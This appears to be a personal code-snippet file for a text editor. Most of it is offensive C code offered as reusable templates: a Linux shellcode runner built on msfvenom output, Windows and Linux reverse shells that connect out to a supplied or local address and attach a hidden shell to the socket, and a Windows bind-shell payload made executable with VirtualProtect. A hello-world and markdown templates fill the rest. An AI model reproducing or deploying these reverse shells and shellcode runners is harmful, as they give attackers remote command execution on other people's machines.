- protip: `use  CTRL  +  SPACE`  to **show the file(EXT) current snippets**




## Global

`SEP, CTRL + R`

```


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



```





## C

`=========================================================`

- `Note: that is not a typo. It was intentionally written SHELCODE`

tab trig: SHELCODE

```

/*
  https://gist.github.com/loneicewolf/8232aad5722e1e7de9d92932b5a01597
  https://gist.github.com/loneicewolf/8232aad5722e1e7de9d92932b5a01597#file-shellcode_addon-c
  https://gist.githubusercontent.com/loneicewolf/8232aad5722e1e7de9d92932b5a01597/raw/6cd8013330b557cb8553124b01d55b334f6f8a9b/shellcode_addon.c
*/

// some opts not abs. nec. but including for future ref. keeping.
// gcc lin_1.c -o L1 -fno-stack-protector -z execstack -no-pie  -g

//  msfvenom -p linux/x64/exec cmd="echo ABC \&\& echo XYZ" -f c -v sh_1
//  [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
//  [-] No arch selected, selecting arch: x64 from the payload
//  No encoder specified, outputting raw payload
//  Payload size: 57 bytes
//  Final size of c file: 265 bytes
//  unsigned char sh_1[] = 
//  "\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52"
//  "\x66\x68\x2d\x63\x54\x5e\x52\xe8\x15\x00\x00\x00\x65\x63\x68"
//  "\x6f\x20\x41\x42\x43\x20\x26\x26\x20\x65\x63\x68\x6f\x20\x58"
//  "\x59\x5a\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05";
//  //  

#include <stdio.h>
#include <unistd.h>

int main(){
  unsigned char sh_1[] = 
  "\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52"
  "\x66\x68\x2d\x63\x54\x5e\x52\xe8\x15\x00\x00\x00\x65\x63\x68"
  "\x6f\x20\x41\x42\x43\x20\x26\x26\x20\x65\x63\x68\x6f\x20\x58"
  "\x59\x5a\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05";
// (*(void(*)())XXX)();
(*(void(*)())sh_1)();
return 0;
}


```


`=========================================================`



`=========================================================`


tab trig: HELLO

```

#include <stdio.h>
int main(){
printf("ABC");
return 0;
}

```

`=========================================================`






`=========================================================`

tab trig: RSH


```

LINUX   https://gist.github.com/loneicewolf/8232aad5722e1e7de9d92932b5a01597
WINDOWS https://gist.github.com/loneicewolf/03d71d65735d8b2d34b5c60b1232d144


WINDOWS
--------------------------------------------------

compact_windows_reverse_shell.c 


// code inspired and modified from defcon25,MSDocs,StackOverflow
// i686-w64-mingw32-gcc -o win_rsh win_rsh.c -lws2_32

#include <ws2tcpip.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32")
int main(int argc, char *argv[]){
  WSADATA wsaData;
  SOCKET sock;
  struct sockaddr_in server;
  STARTUPINFOA si = { 0 };
  PROCESS_INFORMATION pi;

  if (argc != 4){
    printf("Usage: %s ipv4  port  binary\n",argv[0]);
    printf("\tExample 1:%s\v10.10.10.48 1234 myapp.exe\n",argv[0]);
    printf("\tExample 2:%s\v10.10.10.1  4444 netsh\n",argv[0]); // pops a reverse 'net shell' to 10.10.10.1 on port 4444      //  (nc -nvlp 4444)
    return EXIT_FAILURE;
  }
  
  WSAStartup(MAKEWORD(1, 0), &wsaData);
  sock = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
  server.sin_family = AF_INET;
  inet_pton(AF_INET, argv[1], &server.sin_addr.s_addr);
  server.sin_port = htons(atoi(argv[2]));
  WSAConnect(sock, (const PSOCKADDR)&server, sizeof(server), NULL, NULL, NULL, NULL);
  si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
  si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
  si.wShowWindow = SW_HIDE;
  si.cb = sizeof(si);

  CreateProcessA(NULL,                /*       [in, optional]      LPCSTR                lpApplicationName,   */
                argv[3],              /*       [in, out, optional] LPSTR                 lpCommandLine,       */
                NULL,                 /*       [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes, */
                NULL,                 /*       [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,  */
                TRUE,                 /*       [in]                BOOL                  bInheritHandles,     */
                CREATE_NEW_CONSOLE,   /*       [in]                DWORD                 dwCreationFlags,     */
                NULL,                 /*       [in, optional]      LPVOID                lpEnvironment,       */
                NULL,                 /*       [in, optional]      LPCSTR                lpCurrentDirectory,  */
                &si,                  /*       [in]                LPSTARTUPINFOA        lpStartupInfo,       */
                &pi                   /*       [out]               LPPROCESS_INFORMATION lpProcessInformation */
              );

  return EXIT_SUCCESS;
}





shellcode_addon.c
// i686-w64-mingw32-gcc -o A a.c
// code taken and modified from
// https://stackoverflow.com/questions/38161809/generating-shellcode-from-an-exe

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>
int main(){
  // msfvenom -p windows/shell_bind_tcp -f c -v windows_shellbindtcp
  unsigned char windows_shellbindtcp[] = 
  "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
  "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
  "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
  "\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
  "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
  "\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
  "\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
  "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
  "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
  "\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
  "\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
  "\x29\x80\x6b\x00\xff\xd5\x6a\x08\x59\x50\xe2\xfd\x40\x50\x40"
  "\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x11\x5c\x89"
  "\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x57\x68\xb7"
  "\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57\x97"
  "\x68\x75\x6e\x4d\x61\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57"
  "\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c"
  "\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46"
  "\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0"
  "\x4e\x56\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5"
  "\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb"
  "\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5";
  
  
  DWORD why_must_this_variable;
  
  // [ Docs / Windows / Apps / Win32 / API / System Services / Memoryapi.h  /  ]
  // VirtualProtect function (memoryapi.h)
  // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
  BOOL ret = VirtualProtect(
    windows_shellbindtcp,           /* [in]  LPVOID lpAddress, */
    strlen(windows_shellbindtcp),   /* [in]  SIZE_T dwSize, */
    PAGE_EXECUTE_READWRITE,         /* [in]  DWORD  flNewProtect, */
    &why_must_this_variable         /* [out] PDWORD lpflOldProtect */
  );
  
  if (!ret){
    printf ("VirtualProtect\n");
    return EXIT_FAILURE;
  }
  printf("strlen(windows_shellbindtcp)=%d\n", strlen(windows_shellbindtcp));
  ((void (*)(void))windows_shellbindtcp)();
  return EXIT_SUCCESS;
}

--------------------------------------------------







LINUX
--------------------------------------------------
compact_linux_reverse_shell.c

// gcc -g -o L1 lin_1.c
#include <arpa/inet.h>
#include <stdio.h>
#include <unistd.h>
#define RP 1234
#define RH "127.0.0.1"
#define BIN "/bin/sh"
int main(){
int is = 0;is = socket(AF_INET,SOCK_STREAM,0);
struct  sockaddr_in s1;
s1.sin_family      = AF_INET;
s1.sin_port        = htons(RP);
s1.sin_addr.s_addr = inet_addr(RH);
connect( is,(struct sockaddr *) &s1,sizeof(s1));
for(int i=0;i<3;dup2(is,i),i++);
char * const argv[] = {BIN,NULL};
execve(BIN, argv, NULL);
return 0;}



shellcode_addon.c

// some opts not abs. nec. but including for future ref. keeping.
// gcc lin_1.c -o L1 -fno-stack-protector -z execstack -no-pie  -g

//  msfvenom -p linux/x64/exec cmd="echo ABC \&\& echo XYZ" -f c -v sh_1
//  [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
//  [-] No arch selected, selecting arch: x64 from the payload
//  No encoder specified, outputting raw payload
//  Payload size: 57 bytes
//  Final size of c file: 265 bytes
//  unsigned char sh_1[] = 
//  "\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52"
//  "\x66\x68\x2d\x63\x54\x5e\x52\xe8\x15\x00\x00\x00\x65\x63\x68"
//  "\x6f\x20\x41\x42\x43\x20\x26\x26\x20\x65\x63\x68\x6f\x20\x58"
//  "\x59\x5a\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05";
//  //  

#include <stdio.h>
#include <unistd.h>

int main(){
  unsigned char sh_1[] = 
  "\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52"
  "\x66\x68\x2d\x63\x54\x5e\x52\xe8\x15\x00\x00\x00\x65\x63\x68"
  "\x6f\x20\x41\x42\x43\x20\x26\x26\x20\x65\x63\x68\x6f\x20\x58"
  "\x59\x5a\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05";
// (*(void(*)())XXX)();
(*(void(*)())sh_1)();
return 0;
}


--------------------------------------------------


```



## GLobal

- `name: s1`
- `tab trig.: S1`

```



# 
---

input
${1:1_description}
${2:2_description}

output
$1
$2


---




# 
---

<details>
<summary> Click to expand </summary>

abc
xyz

</details>

---


```




